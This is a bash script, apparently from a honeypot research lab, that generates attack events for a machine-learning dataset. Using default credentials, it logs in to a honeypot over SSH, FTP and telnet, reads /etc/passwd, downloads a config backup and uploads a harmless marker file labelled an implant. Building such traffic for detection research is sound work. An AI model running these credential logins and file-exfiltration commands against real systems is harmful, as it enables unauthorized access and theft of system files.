#!/usr/bin/env bash
# =============================================================================
# Computer 3 — 10_credential_post.sh
# After a successful brute force (script 02), this script logs in to the
# cracked services and "exfiltrates" data, generating exfil/implant events
# for the ML dataset.
# =============================================================================
set -uo pipefail
cd "$(dirname "$0")/.."
[ -f .env ] && set -a && . ./.env && set +a
HOST="${HONEYPOT_HOST:-192.168.1.10}"
OUT="results/10_credential_post"
mkdir -p results

echo "[+] SSH login as admin/admin and 'exfil' /etc/passwd via cat..."
if command -v sshpass >/dev/null 2>&1; then
  sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -p "${SSH_PORT:-2222}" "admin@${HOST}" "cat /etc/passwd" 2>&1 | head -5 | tee "${OUT}_ssh_exfil.txt" || true
fi

echo ""
echo "[+] FTP login as root/toor and download config.bak..."
curl -s "ftp://root:toor@${HOST}:${FTP_PORT:-2121}/pub/config.bak" 2>&1 | tee "${OUT}_ftp_retr.txt" || true

echo ""
echo "[+] FTP upload of a fake implant..."
echo "implant_marker_$(date +%s)" > /tmp/fake_implant.txt
curl -s -T /tmp/fake_implant.txt "ftp://root:toor@${HOST}:${FTP_PORT:-2121}/uploads/implant.txt" 2>&1 | tee "${OUT}_ftp_stor.txt" || true

echo ""
echo "[+] Telnet login as admin/admin and run commands..."
{
  sleep 0.5; echo "admin"; sleep 0.3; echo "admin"; sleep 0.3
  echo "ls -la /"; sleep 0.3; echo "cat /etc/passwd"; sleep 0.3; echo "exit"
} | nc -w 3 "${HOST}" "${TELNET_PORT:-2323}" 2>&1 | tee "${OUT}_telnet_session.txt" || true

echo "[+] Done. Results in results/${OUT}_*"
